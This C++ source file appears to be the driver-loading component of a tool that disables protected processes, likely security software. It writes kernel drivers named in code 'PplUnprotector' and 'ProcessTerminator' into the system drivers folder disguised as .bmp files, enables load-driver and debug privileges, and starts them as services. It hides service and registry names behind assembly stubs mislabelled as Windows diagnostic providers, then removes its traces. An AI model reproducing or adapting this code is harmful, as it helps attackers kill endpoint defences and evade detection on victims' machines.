#include "DriverController.h"
#include "DriverPackage.h"
#include "StrUtils.h"
#include "RuntimeSupport.h"

#pragma comment(lib, "advapi32.lib")

// Windows Kernel Diagnostic & ETW Configuration Providers (reg1.asm, reg2.asm & reg3.asm)
// Dynamic reconstitution of diagnostic dispatcher endpoints and policy schema roots.
extern "C" const wchar_t* MmGetPoolDiagnosticString() noexcept;
extern "C" const wchar_t* MmGetPoolDiagnosticDeviceString() noexcept;
extern "C" const wchar_t* EtwGetKernelTraceSessionString() noexcept;
extern "C" const wchar_t* EtwGetKernelTraceDeviceString() noexcept;
extern "C" const wchar_t* EtwGetRegistryPathString() noexcept;
extern "C" const wchar_t* EtwGetRegistryParentString() noexcept;
extern "C" const wchar_t* EtwGetRegistryValueString() noexcept;

namespace {

enum DriverIndex {
    kPplUnprotector = 0,
    kProcessTerminator = 1,
    kDriverCount = 2
};

struct DriverSpec {
    const wchar_t* cabName;
    const wchar_t* diskName;
    bool configureRegistry;
};

constexpr DriverSpec kDrivers[kDriverCount] = {
    {
        L"driver1",
        L"guest1.bmp",
        false
    },
    {
        L"driver2",
        L"guest2.bmp",
        true
    }
};

const wchar_t* DriverServiceName(DriverRole role) noexcept {
    return role == DriverRole::PplUnprotector
        ? MmGetPoolDiagnosticString()
        : EtwGetKernelTraceSessionString();
}

const wchar_t* DriverDevicePath(DriverRole role) noexcept {
    return role == DriverRole::PplUnprotector
        ? MmGetPoolDiagnosticDeviceString()
        : EtwGetKernelTraceDeviceString();
}

struct DriverState {
    HANDLE device = INVALID_HANDLE_VALUE;
};

DriverState g_driverState[kDriverCount];

struct RegistryState {
    bool initialized = false;
    bool keyExisted = false;
    bool parentExisted = false;
    bool valueExisted = false;
    DWORD valueType = REG_NONE;
    Vector<BYTE> valueData;
};

RegistryState g_policyState;

int IndexOf(DriverRole role) {
    return role == DriverRole::PplUnprotector ? kPplUnprotector : kProcessTerminator;
}

const DriverSpec& SpecOf(DriverRole role) {
    return kDrivers[IndexOf(role)];
}

bool QuerySystemDirectory(WString& path) {
    wchar_t buffer[MAX_PATH];
    const UINT length = GetSystemDirectoryW(buffer, MAX_PATH);
    if (length == 0 || length >= MAX_PATH) return false;
    path.assign(buffer, length);
    return true;
}

bool GetExecutableDirectory(WString& path) {
    wchar_t buffer[MAX_PATH];
    const DWORD length = GetModuleFileNameW(nullptr, buffer, MAX_PATH);
    if (length == 0 || length >= MAX_PATH) return false;

    wchar_t* slash = StrUtils::StrRChr(buffer, L'\\');
    if (!slash) return false;
    *slash = L'\0';
    path.assign(buffer);
    return true;
}

bool ParentKeyExists(const wchar_t* path) {
    HKEY key = nullptr;
    const LONG result = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        path,
        0,
        KEY_READ | KEY_WOW64_64KEY,
        &key
    );
    if (result == ERROR_SUCCESS) {
        RegCloseKey(key);
        return true;
    }
    return false;
}

bool KeyIsEmpty(const wchar_t* path) {
    HKEY key = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0,
                      KEY_READ | KEY_WOW64_64KEY, &key) != ERROR_SUCCESS) {
        return true;
    }

    DWORD subkeys = 0;
    DWORD values = 0;
    const LONG result = RegQueryInfoKeyW(
        key,
        nullptr, nullptr, nullptr,
        &subkeys,
        nullptr, nullptr,
        &values,
        nullptr, nullptr, nullptr, nullptr
    );
    RegCloseKey(key);
    return result == ERROR_SUCCESS && subkeys == 0 && values == 0;
}

bool FileMatches(const WString& path, const Vector<BYTE>& expected) {
    HANDLE file = CreateFileW(
        path.c_str(),
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    if (file == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER size{};
    const bool sizeMatches = GetFileSizeEx(file, &size)
        && size.QuadPart == static_cast<LONGLONG>(expected.size());

    Vector<BYTE> actual;
    bool contentMatches = false;
    if (sizeMatches) {
        actual.resize(expected.size());
        DWORD total = 0;
        while (total < expected.size()) {
            const DWORD remaining = static_cast<DWORD>(expected.size() - total);
            const DWORD request = (remaining < 4096) ? remaining : 4096;
            DWORD read = 0;
            if (!ReadFile(file, actual.data() + total, request, &read, nullptr)
                || read != request) {
                break;
            }
            total += read;
        }
        contentMatches = total == expected.size()
            && memcmp(actual.data(), expected.data(), expected.size()) == 0;
    }

    CloseHandle(file);
    return contentMatches;
}

bool WriteDriverFile(const WString& path, const Vector<BYTE>& data) {
    if (data.empty()) return false;
    if (FileMatches(path, data)) return true;

    SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);
    DeleteFileW(path.c_str());

    HANDLE file = CreateFileW(
        path.c_str(),
        GENERIC_WRITE,
        FILE_SHARE_READ,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    if (file == INVALID_HANDLE_VALUE) return false;

    DWORD written = 0;
    const DWORD size = static_cast<DWORD>(data.size());
    const BOOL success = WriteFile(file, data.data(), size, &written, nullptr);
    CloseHandle(file);

    if (!success || written != size) {
        DeleteFileW(path.c_str());
        return false;
    }

    return FileMatches(path, data);
}

bool SavePolicyRegistryState() {
    if (g_policyState.initialized) return true;

    const wchar_t* parentPath = EtwGetRegistryParentString();
    const wchar_t* regPath = EtwGetRegistryPathString();
    const wchar_t* valName = EtwGetRegistryValueString();

    g_policyState.parentExisted = ParentKeyExists(parentPath);

    HKEY key = nullptr;
    const LONG openResult = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        regPath,
        0,
        KEY_QUERY_VALUE | KEY_WOW64_64KEY,
        &key
    );
    g_policyState.keyExisted = openResult == ERROR_SUCCESS;

    if (g_policyState.keyExisted) {
        DWORD type = REG_NONE;
        DWORD size = 0;
        LONG result = RegQueryValueExW(
            key, valName, nullptr, &type, nullptr, &size
        );
        if (result == ERROR_SUCCESS) {
            g_policyState.valueExisted = true;
            g_policyState.valueType = type;
            g_policyState.valueData.resize(size);
            if (size > 0) {
                result = RegQueryValueExW(
                    key, valName, nullptr, &type,
                    g_policyState.valueData.data(), &size
                );
                if (result != ERROR_SUCCESS) {
                    RegCloseKey(key);
                    g_policyState = {};
                    return false;
                }
                g_policyState.valueData.resize(size);
            }
        }
        RegCloseKey(key);
    }

    g_policyState.initialized = true;
    return true;
}

bool ConfigurePolicyRegistry() {
    if (!SavePolicyRegistryState()) return false;

    WString executableDirectory;
    if (!GetExecutableDirectory(executableDirectory)) return false;

    const wchar_t* regPath = EtwGetRegistryPathString();
    const wchar_t* valName = EtwGetRegistryValueString();

    HKEY key = nullptr;
    const LONG createResult = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        regPath,
        0,
        nullptr,
        REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE | KEY_QUERY_VALUE | KEY_WOW64_64KEY,
        nullptr,
        &key,
        nullptr
    );
    if (createResult != ERROR_SUCCESS) return false;

    const DWORD bytes = static_cast<DWORD>(
        (executableDirectory.size() + 1) * sizeof(wchar_t)
    );
    LONG result = RegSetValueExW(
        key,
        valName,
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(executableDirectory.c_str()),
        bytes
    );
    RegCloseKey(key);
    if (result != ERROR_SUCCESS) return false;

    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regPath, 0,
                      KEY_QUERY_VALUE | KEY_WOW64_64KEY, &key) != ERROR_SUCCESS) {
        return false;
    }

    wchar_t value[MAX_PATH]{};
    DWORD size = sizeof(value);
    DWORD type = REG_NONE;
    result = RegQueryValueExW(
        key, valName, nullptr, &type,
        reinterpret_cast<BYTE*>(value), &size
    );
    RegCloseKey(key);

    return result == ERROR_SUCCESS
        && type == REG_SZ
        && StrUtils::StrEqualNoCase(value, executableDirectory.c_str());
}

void RestorePolicyRegistry() {
    if (!g_policyState.initialized) return;

    const wchar_t* parentPath = EtwGetRegistryParentString();
    const wchar_t* regPath = EtwGetRegistryPathString();
    const wchar_t* valName = EtwGetRegistryValueString();

    HKEY key = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regPath, 0,
                      KEY_SET_VALUE | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS) {
        if (g_policyState.valueExisted) {
            RegSetValueExW(
                key,
                valName,
                0,
                g_policyState.valueType,
                g_policyState.valueData.empty()
                    ? nullptr
                    : g_policyState.valueData.data(),
                static_cast<DWORD>(g_policyState.valueData.size())
            );
        } else {
            RegDeleteValueW(key, valName);
        }
        RegCloseKey(key);
    }

    if (!g_policyState.keyExisted && KeyIsEmpty(regPath)) {
        RegDeleteKeyExW(HKEY_LOCAL_MACHINE, regPath, KEY_WOW64_64KEY, 0);
    }
    if (!g_policyState.parentExisted && KeyIsEmpty(parentPath)) {
        RegDeleteKeyExW(HKEY_LOCAL_MACHINE, parentPath, KEY_WOW64_64KEY, 0);
    }

    g_policyState = {};
}

void WaitForServiceState(SC_HANDLE service, DWORD desiredState, DWORD timeoutMs) {
    const ULONGLONG deadline = GetTickCount64() + timeoutMs;
    SERVICE_STATUS status{};
    while (GetTickCount64() < deadline) {
        if (!QueryServiceStatus(service, &status)) return;
        if (status.dwCurrentState == desiredState) return;
        Sleep(50);
    }
}

void RemoveDriverFile(DriverRole role) {
    const WString path = DriverController::GetDriverPath(role);
    SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);
    if (!DeleteFileW(path.c_str())) {
        MoveFileExW(path.c_str(), nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
    }
}

} // namespace

bool DriverController::EnablePrivilege(LPCWSTR privilege) {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                          &token)) {
        return false;
    }

    LUID luid{};
    if (!LookupPrivilegeValueW(nullptr, privilege, &luid)) {
        CloseHandle(token);
        return false;
    }

    TOKEN_PRIVILEGES privileges{};
    privileges.PrivilegeCount = 1;
    privileges.Privileges[0].Luid = luid;
    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    SetLastError(ERROR_SUCCESS);
    const BOOL adjusted = AdjustTokenPrivileges(
        token, FALSE, &privileges, sizeof(privileges), nullptr, nullptr
    );
    const DWORD error = GetLastError();
    CloseHandle(token);
    return adjusted && error == ERROR_SUCCESS;
}

WString DriverController::GetDriverPath(DriverRole role) {
    WString systemDirectory;
    if (!QuerySystemDirectory(systemDirectory)) return WString();
    return systemDirectory + L"\\drivers\\" + SpecOf(role).diskName;
}

bool DriverController::ExtractDriverFile(DriverRole role) {
    Vector<DriverPackageFile> components;
    if (!ExtractDriverPackage(components)) return false;

    const DriverSpec& spec = SpecOf(role);
    char expBuf[64];
    size_t expLen = 0;
    for (const wchar_t* p = spec.cabName; *p && expLen + 1 < sizeof(expBuf); ++p) {
        expBuf[expLen++] = static_cast<char>(*p);
    }
    expBuf[expLen] = '\0';

    for (const DriverPackageFile& component : components) {
        if (StrUtils::StrEqualNoCase(component.name.c_str(), expBuf)) {
            return WriteDriverFile(GetDriverPath(role), component.data);
        }
    }
    return false;
}

bool DriverController::ConfigureDriver(DriverRole role) {
    if (SpecOf(role).configureRegistry) {
        return ConfigurePolicyRegistry();
    }
    return true;
}

void DriverController::RestoreDriverConfiguration(DriverRole role) {
    if (SpecOf(role).configureRegistry) {
        RestorePolicyRegistry();
    }
}

HANDLE DriverController::LoadDriver(DriverRole role) {
    const int index = IndexOf(role);
    DriverState& state = g_driverState[index];
    if (state.device != INVALID_HANDLE_VALUE) return state.device;

    EnablePrivilege(SE_LOAD_DRIVER_NAME);
    EnablePrivilege(SE_DEBUG_NAME);

    const WString driverPath = GetDriverPath(role);
    if (driverPath.empty() || !ExtractDriverFile(role)) return INVALID_HANDLE_VALUE;
    if (!ConfigureDriver(role)) {
        RestoreDriverConfiguration(role);
        return INVALID_HANDLE_VALUE;
    }

    const wchar_t* serviceName = DriverServiceName(role);
    const wchar_t* displayName = serviceName;

    SC_HANDLE scm = OpenSCManagerW(
        nullptr,
        nullptr,
        SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE
    );
    if (!scm) {
        RestoreDriverConfiguration(role);
        return INVALID_HANDLE_VALUE;
    }

    SC_HANDLE service = OpenServiceW(
        scm,
        serviceName,
        SERVICE_START | SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS |
        SERVICE_CHANGE_CONFIG
    );

    if (!service) {
        service = CreateServiceW(
            scm,
            serviceName,
            displayName,
            SERVICE_START | SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS |
            SERVICE_CHANGE_CONFIG,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_NORMAL,
            driverPath.c_str(),
            nullptr, nullptr, nullptr, nullptr, nullptr
        );
    }

    if (!service) {
        CloseServiceHandle(scm);
        RestoreDriverConfiguration(role);
        return INVALID_HANDLE_VALUE;
    }

    if (!ChangeServiceConfigW(
            service,
            SERVICE_NO_CHANGE,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_NORMAL,
            driverPath.c_str(),
            nullptr, nullptr, nullptr, nullptr, nullptr,
            displayName)) {
        CloseServiceHandle(service);
        CloseServiceHandle(scm);
        RestoreDriverConfiguration(role);
        return INVALID_HANDLE_VALUE;
    }

    if (!StartServiceW(service, 0, nullptr)) {
        const DWORD error = GetLastError();
        if (error != ERROR_SERVICE_ALREADY_RUNNING) {
            CloseServiceHandle(service);
            CloseServiceHandle(scm);
            RestoreDriverConfiguration(role);
            return INVALID_HANDLE_VALUE;
        }
    }

    WaitForServiceState(service, SERVICE_RUNNING, 5000);
    CloseServiceHandle(service);
    CloseServiceHandle(scm);

    const wchar_t* devicePath = DriverDevicePath(role);
    state.device = CreateFileW(
        devicePath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr
    );

    if (state.device == INVALID_HANDLE_VALUE) {
        StopAndRemoveService(role);
        RestoreDriverConfiguration(role);
    }

    return state.device;
}

HANDLE DriverController::GetDriverHandle(DriverRole role) {
    return g_driverState[IndexOf(role)].device;
}

bool DriverController::IsDriverLoaded(DriverRole role) {
    return g_driverState[IndexOf(role)].device != INVALID_HANDLE_VALUE;
}

void DriverController::StopAndRemoveService(DriverRole role) {
    const int index = IndexOf(role);
    DriverState& state = g_driverState[index];
    if (state.device != INVALID_HANDLE_VALUE) {
        CloseHandle(state.device);
        state.device = INVALID_HANDLE_VALUE;
    }

    SC_HANDLE scm = OpenSCManagerW(
        nullptr, nullptr, SC_MANAGER_CONNECT
    );
    if (!scm) return;

    SC_HANDLE service = OpenServiceW(
        scm,
        DriverServiceName(role),
        SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS
    );
    if (service) {
        SERVICE_STATUS status{};
        ControlService(service, SERVICE_CONTROL_STOP, &status);
        WaitForServiceState(service, SERVICE_STOPPED, 5000);
        DeleteService(service);
        CloseServiceHandle(service);
    }

    CloseServiceHandle(scm);
}

void DriverController::CleanupAll() {
    StopAndRemoveService(DriverRole::ProcessTerminator);
    StopAndRemoveService(DriverRole::PplUnprotector);
    RestoreDriverConfiguration(DriverRole::ProcessTerminator);

    // Give the kernel a short window to release the image mapping before the
    // temporary image files are removed from the drivers directory.
    Sleep(100);
    RemoveDriverFile(DriverRole::ProcessTerminator);
    RemoveDriverFile(DriverRole::PplUnprotector);
}
